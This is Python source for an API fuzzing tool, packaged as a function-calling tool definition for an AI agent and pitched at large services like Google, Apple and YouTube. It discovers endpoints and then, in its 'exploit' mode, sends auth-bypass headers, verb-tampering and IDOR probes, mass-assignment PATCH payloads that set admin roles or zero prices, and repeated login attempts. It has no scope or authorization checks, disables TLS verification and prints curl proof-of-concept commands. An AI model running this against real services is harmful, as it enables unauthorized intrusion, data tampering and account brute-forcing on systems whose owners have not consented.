"""
Advanced API fuzzer — REST endpoint discovery, auth bypass, rate limit testing,
BOLA/BFLA detection, HTTP verb tampering, content-type confusion, mass assignment.
Designed for heavily defended APIs like Google, Apple, YouTube.
"""

import requests
import json
import time
import re
import hashlib
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, quote

from tools.target_reachability import (
    format_fallback_notice,
    format_unreachable_error,
    resolve_web_target,
)

HDR = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

# Common API paths to discover
API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
    "/v1", "/v2", "/v3", "/rest", "/rest/v1", "/rest/v2",
    "/api/users", "/api/user", "/api/me", "/api/profile",
    "/api/admin", "/api/config", "/api/settings", "/api/health",
    "/api/status", "/api/info", "/api/version", "/api/debug",
    "/api/docs", "/api/swagger", "/api/openapi", "/api/spec",
    "/api/graphql", "/api/search", "/api/auth", "/api/login",
    "/api/register", "/api/signup", "/api/token", "/api/refresh",
    "/api/reset", "/api/password", "/api/forgot", "/api/verify",
    "/api/upload", "/api/download", "/api/export", "/api/import",
    "/api/webhook", "/api/callback", "/api/notify",
    "/api/payments", "/api/billing", "/api/orders", "/api/cart",
    "/api/products", "/api/items", "/api/categories",
    "/api/comments", "/api/posts", "/api/articles", "/api/pages",
    "/api/files", "/api/media", "/api/images", "/api/documents",
    "/api/logs", "/api/audit", "/api/analytics", "/api/metrics",
    "/api/internal", "/api/private", "/api/system",
    "/swagger.json", "/swagger/v1/swagger.json", "/openapi.json",
    "/api-docs", "/api-docs/swagger.json", "/redoc",
    "/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
    "/oauth/token", "/oauth/authorize", "/oauth2/token",
    "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
    "/actuator/mappings", "/actuator/configprops", "/actuator/heapdump",
    "/_debug", "/_status", "/_health", "/_info", "/_config",
    "/wp-json/wp/v2/", "/wp-json/", "/xmlrpc.php",
    "/sitemap.xml", "/robots.txt", "/.well-known/security.txt",
]

# HTTP methods to test
METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]

# Auth bypass headers
AUTH_BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Forwarded-Proto": "https"},
    {"X-HTTP-Method-Override": "PUT"},
    {"X-Method-Override": "PUT"},
    {"X-Requested-With": "XMLHttpRequest"},
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
]

# Content types to try for type confusion
CONTENT_TYPES = [
    "application/json",
    "application/xml",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/plain",
    "text/xml",
    "application/graphql",
]


def _baseline(url):
    """Get baseline response."""
    try:
        r = requests.get(url, timeout=8, headers=HDR, verify=False)
        return {"status": r.status_code, "len": len(r.text), "hash": hashlib.md5(r.text.encode()).hexdigest()}
    except Exception:
        return None


def _differs(r, bl, threshold=100):
    """Check if response differs from baseline."""
    if not bl:
        return True
    if r.status_code != bl["status"]:
        return True
    if abs(len(r.text) - bl["len"]) > threshold:
        return True
    return False


def api_fuzz(target, mode="discover", stream_callback=None):
    """
    Advanced API fuzzing suite.
    mode: 'discover' (find endpoints), 'exploit' (test all attacks), 'full' (both)
    """
    def _emit(msg):
        if stream_callback:
            stream_callback("apifuzz_progress", {"message": msg})

    _emit("🌐 Resolving reachable target URL...")
    resolution = resolve_web_target(target, headers=HDR)
    if not resolution.get("ok"):
        _emit("  ❌ Target unreachable across allowed URL variants")
        return format_unreachable_error(target, resolution)

    base = (resolution.get("selected_url") or resolution.get("normalized_url") or target).rstrip("/")
    fallback_note = format_fallback_notice(resolution)
    if fallback_note:
        _emit("  ↪ %s" % fallback_note)

    _emit(f"🎯 API Fuzzing: {base} (mode: {mode})")
    start = time.time()
    findings = []
    discovered_endpoints = []

    # ── Phase 1: Endpoint Discovery ──
    if mode in ("discover", "full"):
        _emit(f"🔍 Phase 1: Discovering API endpoints ({len(API_PATHS)} paths)...")
        bl = _baseline(base)

        def _probe(path):
            url = f"{base}{path}"
            try:
                r = requests.get(url, timeout=6, headers=HDR, verify=False, allow_redirects=False)
                if r.status_code in (200, 201, 301, 302, 401, 403, 405):
                    if r.status_code != 404 and _differs(r, bl, 200):
                        ct = r.headers.get("Content-Type", "")
                        return {
                            "path": path, "url": url, "status": r.status_code,
                            "size": len(r.text), "content_type": ct,
                            "is_json": "json" in ct, "is_api": "json" in ct or "xml" in ct,
                        }
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=25) as executor:
            futures = {executor.submit(_probe, p): p for p in API_PATHS}
            done = 0
            for future in as_completed(futures):
                done += 1
                if done % 20 == 0:
                    _emit(f"  Probed {done}/{len(API_PATHS)} paths...")
                result = future.result()
                if result:
                    discovered_endpoints.append(result)
                    status_icon = "🟢" if result["status"] == 200 else "🟡" if result["status"] in (301, 302) else "🔴" if result["status"] in (401, 403) else "⚪"
                    _emit(f"  {status_icon} [{result['status']}] {result['path']} ({result['size']}b)")

        # Check for OpenAPI/Swagger spec
        for spec_path in ["/swagger.json", "/openapi.json", "/api-docs/swagger.json", "/swagger/v1/swagger.json"]:
            ep = next((e for e in discovered_endpoints if e["path"] == spec_path), None)
            if ep and ep["status"] == 200:
                try:
                    r = requests.get(ep["url"], timeout=10, headers=HDR, verify=False)
                    spec = r.json()
                    paths = spec.get("paths", {})
                    if paths:
                        findings.append({
                            "type": "openapi_exposed",
                            "severity": "HIGH",
                            "desc": f"OpenAPI/Swagger spec exposed with {len(paths)} endpoints!",
                            "url": ep["url"],
                            "endpoints": list(paths.keys())[:30],
                        })
                        _emit(f"  🔴 OpenAPI spec found: {len(paths)} endpoints exposed!")
                        # Add discovered paths
                        for p in paths:
                            if not any(e["path"] == p for e in discovered_endpoints):
                                discovered_endpoints.append({"path": p, "url": f"{base}{p}", "status": 0, "size": 0, "content_type": "", "is_api": True})
                except Exception:
                    pass

    _emit(f"  Found {len(discovered_endpoints)} endpoints")

    # ── Phase 2: HTTP Verb Tampering ──
    if mode in ("exploit", "full"):
        _emit("🔨 Phase 2: HTTP verb tampering...")
        protected = [e for e in discovered_endpoints if e["status"] in (401, 403, 405)]

        for ep in protected[:10]:
            for method in METHODS:
                try:
                    r = requests.request(method, ep["url"], timeout=5, headers=HDR, verify=False)
                    if r.status_code == 200:
                        findings.append({
                            "type": "verb_tampering",
                            "severity": "HIGH",
                            "desc": f"{method} bypasses auth on {ep['path']} (GET={ep['status']} → {method}=200)",
                            "url": ep["url"], "method": method,
                            "cwe": "CWE-650",
                        })
                        _emit(f"  🔴 {method} bypass on {ep['path']}!")
                        break
                except Exception:
                    pass

    # ── Phase 3: Auth Bypass via Headers ──
    if mode in ("exploit", "full"):
        _emit("🔨 Phase 3: Authentication bypass via headers...")
        protected = [e for e in discovered_endpoints if e["status"] in (401, 403)]

        for ep in protected[:8]:
            for bypass_hdr in AUTH_BYPASS_HEADERS:
                try:
                    custom = {**HDR, **bypass_hdr}
                    r = requests.get(ep["url"], timeout=5, headers=custom, verify=False)
                    if r.status_code == 200 and len(r.text) > 50:
                        hdr_name = list(bypass_hdr.keys())[0]
                        findings.append({
                            "type": "auth_bypass_header",
                            "severity": "CRITICAL",
                            "desc": f"Auth bypass on {ep['path']} via {hdr_name}: {bypass_hdr[hdr_name]}",
                            "url": ep["url"], "header": bypass_hdr,
                            "cwe": "CWE-287",
                        })
                        _emit(f"  🔴 AUTH BYPASS: {ep['path']} via {hdr_name}!")
                        break
                except Exception:
                    pass

    # ── Phase 4: BOLA/IDOR Testing ──
    if mode in ("exploit", "full"):
        _emit("🔨 Phase 4: BOLA/IDOR testing...")
        for ep in discovered_endpoints:
            if ep["status"] == 200 and ep.get("is_api"):
                # Test ID-based IDOR
                for id_suffix in ["/1", "/2", "/0", "/999", "/admin", "?id=1", "?id=2", "?user_id=1"]:
                    try:
                        r = requests.get(f"{ep['url']}{id_suffix}", timeout=5, headers=HDR, verify=False)
                        if r.status_code == 200 and len(r.text) > 20:
                            try:
                                data = r.json()
                                if data and isinstance(data, (dict, list)):
                                    findings.append({
                                        "type": "bola_idor",
                                        "severity": "HIGH",
                                        "desc": f"BOLA/IDOR: {ep['path']}{id_suffix} returns data without auth",
                                        "url": f"{ep['url']}{id_suffix}",
                                        "preview": json.dumps(data)[:200],
                                        "cwe": "CWE-639",
                                    })
                                    _emit(f"  🔴 IDOR: {ep['path']}{id_suffix} exposes data!")
                                    break
                            except Exception:
                                pass
                    except Exception:
                        pass

    # ── Phase 5: Content-Type Confusion ──
    if mode in ("exploit", "full"):
        _emit("🔨 Phase 5: Content-type confusion...")
        for ep in discovered_endpoints[:10]:
            if ep["status"] in (401, 403):
                for ct in CONTENT_TYPES:
                    try:
                        h = {**HDR, "Content-Type": ct}
                        r = requests.post(ep["url"], data="{}", headers=h, timeout=5, verify=False)
                        if r.status_code == 200 and len(r.text) > 50:
                            findings.append({
                                "type": "content_type_bypass",
                                "severity": "MEDIUM",
                                "desc": f"Content-Type confusion on {ep['path']}: POST with {ct} returns 200",
                                "url": ep["url"], "content_type": ct,
                            })
                            _emit(f"  🟡 Content-type bypass: {ep['path']} with {ct}")
                            break
                    except Exception:
                        pass

    # ── Phase 6: Mass Assignment Testing ──
    if mode in ("exploit", "full"):
        _emit("🔨 Phase 6: Mass assignment testing...")
        for ep in discovered_endpoints[:10]:
            if ep.get("is_api") and ep["status"] == 200:
                payloads = [
                    {"role": "admin", "isAdmin": True, "is_admin": True},
                    {"admin": True, "privilege": "admin", "access_level": 99},
                    {"verified": True, "active": True, "enabled": True},
                    {"price": 0, "amount": 0, "discount": 100},
                ]
                for payload in payloads:
                    try:
                        h = {**HDR, "Content-Type": "application/json"}
                        r = requests.patch(ep["url"], json=payload, headers=h, timeout=5, verify=False)
                        if r.status_code in (200, 201):
                            findings.append({
                                "type": "mass_assignment",
                                "severity": "HIGH",
                                "desc": f"Potential mass assignment on {ep['path']}: PATCH accepted admin fields",
                                "url": ep["url"], "payload": payload,
                                "cwe": "CWE-915",
                            })
                            _emit(f"  🔴 Mass assignment: {ep['path']} accepts admin fields via PATCH!")
                            break
                    except Exception:
                        pass

    # ── Phase 7: Rate Limit Testing ──
    if mode in ("exploit", "full"):
        _emit("🔨 Phase 7: Rate limit testing...")
        auth_endpoints = [e for e in discovered_endpoints if any(k in e["path"] for k in ["login", "auth", "token", "password", "reset"])]
        for ep in auth_endpoints[:3]:
            rate_limited = False
            for i in range(20):
                try:
                    r = requests.post(ep["url"], json={"username": "test", "password": f"test{i}"}, 
                                     headers={**HDR, "Content-Type": "application/json"}, timeout=3, verify=False)
                    if r.status_code == 429:
                        rate_limited = True
                        break
                except Exception:
                    break
            if not rate_limited:
                findings.append({
                    "type": "no_rate_limit",
                    "severity": "MEDIUM",
                    "desc": f"No rate limiting on {ep['path']} — brute force possible",
                    "url": ep["url"],
                    "cwe": "CWE-307",
                })
                _emit(f"  🟡 No rate limit on {ep['path']}")

    elapsed = time.time() - start

    # Format output
    lines = [
        f"API FUZZING RESULTS for {base}",
        f"{'='*60}",
        f"Endpoints found: {len(discovered_endpoints)} | Findings: {len(findings)} | Time: {elapsed:.1f}s\n",
    ]
    if fallback_note:
        lines = [fallback_note, ""] + lines

    if discovered_endpoints:
        lines.append(f"📋 DISCOVERED ENDPOINTS ({len(discovered_endpoints)})")
        lines.append("-" * 40)
        for ep in sorted(discovered_endpoints, key=lambda x: x["status"]):
            icon = "🟢" if ep["status"] == 200 else "🔒" if ep["status"] in (401, 403) else "↗️" if ep["status"] in (301, 302) else "⚪"
            lines.append(f"  {icon} [{ep['status']}] {ep['path']} ({ep.get('content_type', '')[:30]})")
        lines.append("")

    if findings:
        for sev in ["CRITICAL", "HIGH", "MEDIUM"]:
            group = [f for f in findings if f["severity"] == sev]
            if group:
                icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}[sev]
                lines.append(f"{icon} {sev} FINDINGS ({len(group)})")
                lines.append("-" * 40)
                for f in group:
                    lines.append(f"  [{f['type']}] {f['desc']}")
                    if f.get("url"):
                        lines.append(f"    URL: {f['url']}")
                    if f.get("cwe"):
                        lines.append(f"    CWE: {f['cwe']}")
                    if f.get("header"):
                        hname = list(f['header'].keys())[0]
                        lines.append(f"    PoC: curl -H '{hname}: {f['header'][hname]}' '{f['url']}'")
                    if f.get("method"):
                        lines.append(f"    PoC: curl -X {f['method']} '{f['url']}'")
                    if f.get("endpoints"):
                        lines.append(f"    Exposed endpoints: {', '.join(f['endpoints'][:10])}")
                    lines.append("")
    else:
        lines.append("No API vulnerabilities found with current testing.")

    return "\n".join(lines)


TOOL_DEFINITION = {
    "type": "function",
    "function": {
        "name": "api_fuzz",
        "description": "Advanced API fuzzer for REST endpoints. Discovers API endpoints (including OpenAPI/Swagger specs), tests HTTP verb tampering, authentication bypass via headers (X-Forwarded-For, X-Original-URL, etc.), BOLA/IDOR detection, content-type confusion, mass assignment, and rate limit testing. Use mode='full' for complete testing. Designed for large APIs like Google, YouTube, Apple.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL to fuzz"
                },
                "mode": {
                    "type": "string",
                    "enum": ["discover", "exploit", "full"],
                    "description": "Fuzzing mode. discover=find endpoints, exploit=test attacks, full=both"
                }
            },
            "required": ["target"]
        }
    }
}
